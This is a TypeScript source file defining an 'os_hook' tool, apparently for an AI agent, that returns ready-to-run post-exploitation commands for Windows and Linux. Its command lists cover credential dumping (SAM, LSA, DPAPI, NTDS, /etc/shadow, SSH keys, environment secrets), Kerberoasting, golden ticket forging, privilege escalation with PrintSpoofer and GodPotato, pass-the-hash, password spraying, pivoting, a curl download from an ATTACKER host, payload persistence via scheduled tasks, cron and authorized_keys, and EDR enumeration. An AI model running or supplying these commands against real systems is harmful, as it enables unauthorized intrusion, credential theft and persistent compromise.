import { Effect, Schema } from "effect"
import DESCRIPTION from "./os-hook.txt"
import * as Tool from "./tool"

type HookEntry = {
  cmd: string
  desc: string
  prereq?: string
  opsec?: string
  alternatives?: string[]
}

type ModuleDB = Record<string, HookEntry[]>

const WINDOWS: Record<string, ModuleDB> = {
  recon: {
    system: [
      { cmd: "systeminfo", desc: "OS version, hotfixes, architecture" },
      { cmd: "hostname && whoami /all", desc: "Current user, groups, privileges" },
      { cmd: "net user", desc: "Local user accounts" },
      { cmd: "net localgroup administrators", desc: "Local admin group members" },
      { cmd: 'net user /domain 2>nul || echo "Not domain-joined"', desc: "Domain users (if joined)" },
      { cmd: "net group \"Domain Admins\" /domain 2>nul", desc: "Domain admin group" },
      { cmd: "net group \"Domain Controllers\" /domain 2>nul", desc: "Domain controllers" },
      { cmd: "tasklist /v", desc: "Running processes with verbose info" },
      { cmd: "wmic service list brief", desc: "Installed services" },
      { cmd: "schtasks /query /fo LIST /v", desc: "Scheduled tasks (verbose)" },
      { cmd: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr /i \"DisplayName\"", desc: "Installed software" },
    ],
    network: [
      { cmd: "ipconfig /all", desc: "All network interfaces, DNS, DHCP" },
      { cmd: "route print", desc: "Routing table" },
      { cmd: "arp -a", desc: "ARP cache — known neighbors" },
      { cmd: "netstat -ano", desc: "Active connections + PIDs" },
      { cmd: "netsh firewall show state 2>nul & netsh advfirewall firewall show rule name=all 2>nul | findstr /i \"Rule Name Direction Action\"", desc: "Firewall rules summary" },
      { cmd: "net share", desc: "Active shares" },
      { cmd: "type C:\\Windows\\System32\\drivers\\etc\\hosts", desc: "Hosts file" },
      { cmd: "nslookup -type=any _ldap._tcp.dc._msdcs.%USERDNSDOMAIN% 2>nul", desc: "Find DCs via DNS" },
    ],
  },
  credential: {
    sam: [
      { cmd: "netexec smb TARGET -u USER -p PASS --sam", desc: "Dump SAM hashes (local accounts)", prereq: "admin access" },
      { cmd: "netexec smb TARGET -u USER -p PASS --lsa", desc: "Dump LSA secrets (cached domain creds, DPAPI keys)", prereq: "admin access" },
      { cmd: "netexec smb TARGET -u USER -p PASS --dpapi", desc: "Dump ALL DPAPI secrets (browser passwords, vaults, cookies, wifi). Bare --dpapi = full dump; do NOT add subcommands (cookies/nosystem) — they LIMIT output", prereq: "admin access", opsec: "high — touches many credential stores" },
      { cmd: "netexec smb TARGET -u USER -p PASS --ntds", desc: "Dump all domain hashes from NTDS.dit", prereq: "DC admin access", opsec: "very high — accesses NTDS" },
      { cmd: "secretsdump.py DOMAIN/USER:PASS@TARGET", desc: "Impacket secretsdump (SAM+LSA+NTDS)", prereq: "admin access", alternatives: ["netexec --sam + --lsa"] },
    ],
    files: [
      { cmd: "dir /s /b C:\\Users\\*password* C:\\Users\\*cred* C:\\Users\\*.kdbx 2>nul", desc: "Search for password files" },
      { cmd: "findstr /si /m password C:\\Users\\*.txt C:\\Users\\*.xml C:\\Users\\*.ini C:\\Users\\*.config 2>nul", desc: "Grep for 'password' in config files" },
      { cmd: "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul", desc: "PowerShell history" },
      { cmd: "cmdkey /list", desc: "Stored Windows credentials (Credential Manager)" },
      { cmd: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v lmcompatibilitylevel 2>nul", desc: "NTLM compatibility level" },
      { cmd: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul | findstr /i \"DefaultPassword AutoAdminLogon\"", desc: "AutoLogon credentials in registry" },
    ],
    kerberos: [
      { cmd: "GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP -request", desc: "Kerberoast — request TGS for SPNs → crack offline (hashcat -m 13100)", prereq: "domain user creds" },
      { cmd: "GetNPUsers.py DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt", desc: "AS-REP roast — no preauth accounts", prereq: "username list" },
      { cmd: "ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN administrator", desc: "Golden ticket forge", prereq: "krbtgt hash" },
      { cmd: "getST.py -spn SERVICE/TARGET -impersonate admin DOMAIN/USER:PASS -dc-ip DC_IP", desc: "Constrained delegation — impersonate user", prereq: "delegation-allowed account" },
    ],
  },
  privesc: {
    checks: [
      { cmd: "whoami /priv", desc: "Check privileges — SeImpersonate/SeDebug/SeAssignPrimary are escalation vectors" },
      { cmd: "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"", desc: "Unquoted service paths" },
      { cmd: "icacls \"C:\\Program Files\\*\" /T /C 2>nul | findstr /i \"(F) (M) (W) Everyone Users Authenticated\"", desc: "Writable service binaries/dirs" },
      { cmd: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul", desc: "AlwaysInstallElevated (MSI→SYSTEM)" },
      { cmd: "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services /s | findstr /i \"ImagePath\" | findstr /i /v \"system32\"", desc: "Non-standard service binaries" },
    ],
    exploits: [
      { cmd: "PrintSpoofer.exe -i -c cmd", desc: "SeImpersonate → SYSTEM via PrintSpoofer", prereq: "SeImpersonatePrivilege" },
      { cmd: "GodPotato.exe -cmd cmd", desc: "SeImpersonate → SYSTEM via GodPotato (works on newer Windows)", prereq: "SeImpersonatePrivilege", alternatives: ["PrintSpoofer", "JuicyPotato", "RoguePotato"] },
      { cmd: "reg save HKLM\\SAM sam.bak & reg save HKLM\\SYSTEM system.bak", desc: "Save SAM/SYSTEM registry hives for offline cracking", prereq: "admin access" },
    ],
  },
  lateral: {
    exec: [
      { cmd: "netexec smb TARGET -u USER -p PASS -x whoami", desc: "Remote command via SMB (smbexec)", prereq: "admin creds" },
      { cmd: "netexec smb TARGET -u USER -H HASH -x whoami", desc: "Pass-the-Hash via SMB" },
      { cmd: "netexec winrm TARGET -u USER -p PASS -x whoami", desc: "Remote command via WinRM" },
      { cmd: "psexec.py DOMAIN/USER:PASS@TARGET", desc: "Impacket PsExec (creates service, SYSTEM)", prereq: "admin creds + SMB writable", opsec: "high — creates service, drops binary" },
      { cmd: "wmiexec.py DOMAIN/USER:PASS@TARGET", desc: "Impacket WMI exec (semi-interactive, no disk artifact)", prereq: "admin creds", opsec: "medium — WMI event log" },
      { cmd: "evil-winrm -i TARGET -u USER -p PASS", desc: "Interactive WinRM shell", prereq: "WinRM enabled (5985/5986)" },
      { cmd: "evil-winrm -i TARGET -u USER -H HASH", desc: "WinRM with NTLM hash" },
      { cmd: "xfreerdp /v:TARGET /u:USER /p:PASS /dynamic-resolution +clipboard", desc: "RDP session (GUI)", prereq: "RDP enabled (3389)" },
      { cmd: "netexec smb TARGET -u USER -p PASS --exec-method atexec -x whoami", desc: "Exec via scheduled task (atexec)", opsec: "medium — task scheduler log" },
    ],
    spray: [
      { cmd: "netexec smb TARGETS -u USER -p PASS", desc: "Password spray — SMB" },
      { cmd: "netexec smb TARGETS -u USER -H HASH", desc: "Hash spray — SMB" },
      { cmd: "netexec winrm TARGETS -u USER -p PASS", desc: "Password spray — WinRM" },
      { cmd: "netexec ssh TARGETS -u USER -p PASS", desc: "Password spray — SSH" },
      { cmd: "netexec mssql TARGETS -u sa -p PASS", desc: "Password spray — MSSQL" },
    ],
  },
  persistence: {
    methods: [
      { cmd: "schtasks /create /tn \"UpdateCheck\" /tr \"C:\\path\\to\\payload.exe\" /sc onlogon /ru SYSTEM", desc: "Scheduled task — runs at logon as SYSTEM", opsec: "medium — visible in task scheduler" },
      { cmd: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\path\\to\\payload.exe\"", desc: "Registry autorun — current user", opsec: "low — common persistence vector" },
      { cmd: "sc create svcname binPath= \"C:\\path\\to\\payload.exe\" start= auto", desc: "Create a service", prereq: "admin", opsec: "medium — visible in services" },
      { cmd: "netsh advfirewall firewall add rule name=\"Allow\" dir=in action=allow protocol=tcp localport=PORT", desc: "Add firewall exception", prereq: "admin" },
    ],
  },
  evasion: {
    enum: [
      { cmd: "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", desc: "Enumerate AV products" },
      { cmd: "sc query WinDefend", desc: "Windows Defender status" },
      { cmd: "Get-MpPreference | select -expand ExclusionPath", desc: "Defender exclusion paths (PS)", prereq: "PowerShell" },
      { cmd: "netsh advfirewall show allprofiles state", desc: "Firewall profile states" },
      { cmd: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA', desc: "UAC status" },
    ],
  },
}

const LINUX: Record<string, ModuleDB> = {
  recon: {
    system: [
      { cmd: "id && hostname && uname -a", desc: "Current user, hostname, kernel" },
      { cmd: "cat /etc/os-release 2>/dev/null || cat /etc/issue", desc: "OS distribution" },
      { cmd: "cat /etc/passwd | grep -v nologin | grep -v false", desc: "Users with login shells" },
      { cmd: "cat /etc/group | grep -E 'sudo|wheel|docker|lxd|adm'", desc: "Privileged groups" },
      { cmd: "ps auxf | head -80", desc: "Running processes (tree)" },
      { cmd: "ss -tlnp", desc: "Listening TCP services" },
      { cmd: "ss -ulnp", desc: "Listening UDP services" },
      { cmd: "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null", desc: "Cron jobs" },
      { cmd: "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null | head -50", desc: "Installed packages (first 50)" },
      { cmd: "cat /etc/fstab", desc: "Filesystem mounts" },
      { cmd: "df -h", desc: "Disk usage" },
      { cmd: "last -20 2>/dev/null", desc: "Recent logins" },
    ],
    network: [
      { cmd: "ip addr show", desc: "All interfaces with IPs" },
      { cmd: "ip route show", desc: "Routing table" },
      { cmd: "arp -a 2>/dev/null || ip neigh", desc: "ARP neighbors" },
      { cmd: "cat /etc/hosts", desc: "Hosts file" },
      { cmd: "cat /etc/resolv.conf", desc: "DNS configuration" },
      { cmd: "iptables -L -n 2>/dev/null || echo 'need root for iptables'", desc: "Firewall rules" },
      { cmd: "cat /proc/net/tcp | awk '{print $2}' | grep -v local | sort -u", desc: "Raw TCP connections" },
    ],
  },
  credential: {
    files: [
      { cmd: "cat /etc/shadow 2>/dev/null", desc: "Shadow file (password hashes)", prereq: "root or shadow group" },
      { cmd: "find / -name '*.bak' -o -name '*.old' -o -name '*.conf' -o -name '*.config' -o -name '.env' 2>/dev/null | head -30", desc: "Backup and config files" },
      { cmd: "find /home -name '.bash_history' -exec echo '=== {} ===' \\; -exec cat {} \\; 2>/dev/null", desc: "All users' bash history" },
      { cmd: "find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null", desc: "SSH private keys" },
      { cmd: "find / -name '*.kdbx' -o -name '*.key' -o -name 'credentials*' -o -name '*password*' 2>/dev/null | grep -v proc | head -20", desc: "Password files / keychains" },
      { cmd: "grep -rli 'password\\|passwd\\|secret\\|token\\|api.key' /etc/ /opt/ /var/www/ 2>/dev/null | head -20", desc: "Grep for credentials in config dirs" },
      { cmd: "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|token|key|api' | sort -u", desc: "Environment variables with credential keywords" },
      { cmd: "find / -name 'wp-config.php' -o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' -o -name '.env' 2>/dev/null | head -20", desc: "Web application config files with DB creds" },
    ],
    databases: [
      { cmd: "grep -r 'password' /etc/mysql/ /etc/my.cnf /var/lib/mysql/.my.cnf 2>/dev/null", desc: "MySQL credential files" },
      { cmd: "cat /var/lib/postgresql/*/data/pg_hba.conf 2>/dev/null", desc: "PostgreSQL auth config" },
      { cmd: "find / -name '.pgpass' 2>/dev/null -exec cat {} \\;", desc: "PostgreSQL password file" },
    ],
  },
  privesc: {
    checks: [
      { cmd: "sudo -l 2>/dev/null", desc: "Sudo permissions — check GTFOBins for each binary" },
      { cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "SUID binaries — check GTFOBins" },
      { cmd: "getcap -r / 2>/dev/null", desc: "Linux capabilities — cap_setuid/cap_dac_override are escalation vectors" },
      { cmd: "find / -writable -type f 2>/dev/null | grep -E '/etc/passwd|/etc/shadow|/etc/cron|/usr/local/bin' | head -20", desc: "Writable sensitive files" },
      { cmd: "ls -la /etc/passwd /etc/shadow", desc: "Shadow file permissions" },
      { cmd: "uname -r && cat /proc/version", desc: "Kernel version for exploit search" },
      { cmd: "id | grep -qE 'docker|lxd' && echo 'DOCKER/LXD GROUP — PRIVESC POSSIBLE'", desc: "Docker/LXD group = root" },
      { cmd: "mount | grep -E 'nosuid|noexec'", desc: "Mount restrictions (for SUID exploitation)" },
      { cmd: "find / -writable -type d 2>/dev/null | grep -E '/tmp|/var|/opt|/usr' | head -10", desc: "World-writable directories" },
      { cmd: "systemctl list-timers --all 2>/dev/null", desc: "Systemd timers (cron alternative)" },
      { cmd: "cat /etc/exports 2>/dev/null", desc: "NFS exports — no_root_squash = root as remote" },
    ],
    exploits: [
      { cmd: "searchsploit linux kernel $(uname -r | cut -d- -f1)", desc: "Search for kernel exploits", prereq: "searchsploit installed" },
      { cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: "Upgrade to interactive TTY" },
    ],
  },
  lateral: {
    move: [
      { cmd: "ssh -D 1080 user@PIVOT_HOST", desc: "SOCKS proxy via SSH (use with proxychains)" },
      { cmd: "ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@PIVOT_HOST", desc: "SSH local port forward" },
      { cmd: "chisel server --port 8080 --reverse --socks5", desc: "Chisel server (attacker side)", alternatives: ["ligolo-ng proxy -selfcert"] },
      { cmd: "chisel client ATTACKER:8080 R:socks", desc: "Chisel client (pivot host)" },
      { cmd: "scp /path/to/file user@TARGET:/tmp/", desc: "File transfer via SCP" },
      { cmd: "python3 -m http.server 8888", desc: "Quick HTTP server for file transfer" },
      { cmd: "curl http://ATTACKER:8888/file -o /tmp/file && chmod +x /tmp/file", desc: "Download file via curl" },
    ],
    spray: [
      { cmd: "netexec ssh TARGETS -u USER -p PASS", desc: "SSH credential spray" },
      { cmd: "netexec smb TARGETS -u USER -p PASS", desc: "SMB credential spray (from Linux)" },
    ],
  },
  persistence: {
    methods: [
      { cmd: "echo '* * * * * /path/to/payload' | crontab -", desc: "Cron persistence (every minute)", opsec: "medium — visible in crontab" },
      { cmd: "echo 'ssh-rsa AAAA... attacker@box' >> ~/.ssh/authorized_keys", desc: "SSH key persistence" },
      { cmd: "echo '/path/to/payload &' >> ~/.bashrc", desc: "Shell startup persistence" },
    ],
  },
  evasion: {
    enum: [
      { cmd: "which apparmor_status selinux sestatus 2>/dev/null && apparmor_status 2>/dev/null; sestatus 2>/dev/null", desc: "AppArmor / SELinux status" },
      { cmd: "cat /var/log/auth.log 2>/dev/null | tail -20", desc: "Recent auth log entries" },
      { cmd: "ls -la /var/log/ | head -20", desc: "Available log files" },
      { cmd: "ps aux | grep -iE 'falcon|crowdstrike|ossec|snort|suricata|wazuh|sentinel|carbon' 2>/dev/null", desc: "EDR/HIDS processes" },
    ],
  },
}

const DB: Record<string, Record<string, ModuleDB>> = {
  windows: WINDOWS,
  linux: LINUX,
}

export const Parameters = Schema.Struct({
  os: Schema.Literals(["windows", "linux"]).annotate({
    description: "Target operating system",
  }),
  module: Schema.Literals(["recon", "credential", "privesc", "lateral", "persistence", "evasion"]).annotate({
    description: "Post-exploitation module",
  }),
  submodule: Schema.optional(
    Schema.String.annotate({
      description:
        "Specific submodule (e.g. 'system', 'network', 'sam', 'files', 'kerberos', 'checks', 'exploits', 'exec', 'spray', 'methods', 'enum', 'move', 'databases'). Omit for all submodules in the module.",
    }),
  ),
  context: Schema.optional(
    Schema.String.annotate({
      description:
        "Current access context to filter relevant commands (e.g. 'user-level', 'admin', 'domain user', 'SeImpersonate')",
    }),
  ),
})

export const OsHookTool = Tool.define(
  "os_hook",
  Effect.gen(function* () {
    return {
      description: DESCRIPTION,
      parameters: Parameters,
      execute: (
        params: { os: string; module: string; submodule?: string; context?: string },
        _ctx: Tool.Context,
      ) =>
        Effect.gen(function* () {
          const meta = { os: params.os, module: params.module, commands: 0 }
          const osDB = DB[params.os]
          if (!osDB) {
            return {
              title: `${params.os}/${params.module}`,
              metadata: meta,
              output: `Unknown OS: ${params.os}. Supported: ${Object.keys(DB).join(", ")}`,
            }
          }

          const moduleDB = osDB[params.module]
          if (!moduleDB) {
            return {
              title: `${params.os}/${params.module}`,
              metadata: meta,
              output: `Unknown module: ${params.module} for ${params.os}. Available: ${Object.keys(osDB).join(", ")}`,
            }
          }

          const submodules = params.submodule
            ? { [params.submodule]: moduleDB[params.submodule] }
            : moduleDB

          const lines: string[] = []
          lines.push(`# ${params.os.toUpperCase()} — ${params.module}`)
          if (params.context) lines.push(`Context: ${params.context}`)
          lines.push("")

          let totalCmds = 0

          for (const [subName, entries] of Object.entries(submodules)) {
            if (!entries) {
              lines.push(`Unknown submodule: ${subName}. Available: ${Object.keys(moduleDB).join(", ")}`)
              continue
            }

            lines.push(`## ${subName}`)
            for (const entry of entries) {
              lines.push(`  ${entry.desc}`)
              lines.push(`  $ ${entry.cmd}`)
              if (entry.prereq) lines.push(`  prereq: ${entry.prereq}`)
              if (entry.opsec) lines.push(`  opsec: ${entry.opsec}`)
              if (entry.alternatives?.length)
                lines.push(`  alternatives: ${entry.alternatives.join(", ")}`)
              lines.push("")
              totalCmds++
            }
          }

          meta.commands = totalCmds
          return {
            title: `${params.os}/${params.module}${params.submodule ? `/${params.submodule}` : ""}`,
            metadata: meta,
            output: lines.join("\n"),
          }
        }).pipe(Effect.orDie),
    }
  }),
)
